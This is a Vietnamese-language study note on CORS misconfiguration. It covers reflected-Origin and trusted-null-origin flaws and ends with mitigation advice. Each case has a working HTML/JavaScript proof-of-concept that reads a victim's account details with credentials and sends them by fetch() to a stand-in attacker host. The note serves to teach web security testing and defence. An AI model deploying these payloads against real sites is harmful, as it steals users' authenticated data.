# 🌐 Cross-Origin Resource Sharing (CORS)

## 1. 📌 Tổng quan
CORS là cơ chế của trình duyệt cho phép ứng dụng web tại một origin (domain, protocol, port) truy cập tài nguyên từ một origin khác. Lỗ hổng CORS xảy ra khi cấu hình sai (misconfiguration) cho phép các domain độc hại đọc được dữ liệu nhạy cảm của người dùng.

---

## 2. 💣 Các trường hợp Misconfiguration phổ biến & Exploit PoC

### Trường hợp 1: Phản chiếu Origin từ Request Header (`Access-Control-Allow-Credentials: true`)
Server tự động lấy giá trị từ header `Origin` của request và trả về trong header `Access-Control-Allow-Origin`.

**Exploit PoC:**
```html
<script>
    var req = new XMLHttpRequest();
    req.onload = function() {
        fetch('https://attacker-collaborator.com/log?data=' + encodeURIComponent(this.responseText));
    };
    req.open('get', 'https://vulnerable-website.com/accountDetails', true);
    req.withCredentials = true;
    req.send();
</script>
```

### Trường hợp 2: Tin tưởng giá trị `Origin: null`
Server cho phép `Origin: null` khi request đến từ iframe `sandbox`.

**Exploit PoC:**
```html
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="
    <script>
        var req = new XMLHttpRequest();
        req.onload = function() {
            fetch('https://attacker-collaborator.com/log?data=' + encodeURIComponent(this.responseText));
        };
        req.open('get', 'https://vulnerable-website.com/accountDetails', true);
        req.withCredentials = true;
        req.send();
    </script>
"></iframe>
```

---

## 3. 🛡️ Biện pháp phòng chống (Mitigation)
1. Chỉ định rõ danh sách origin đáng tin cậy (Strict Whitelist).
2. Không sử dụng `Access-Control-Allow-Origin: *` kết hợp với `Access-Control-Allow-Credentials: true`.
3. Tránh việc parse `Origin` lỏng lẻo bằng regex (VD: `.vulnerable-site.com` dễ bị bypass bằng `attacker-vulnerable-site.com`).
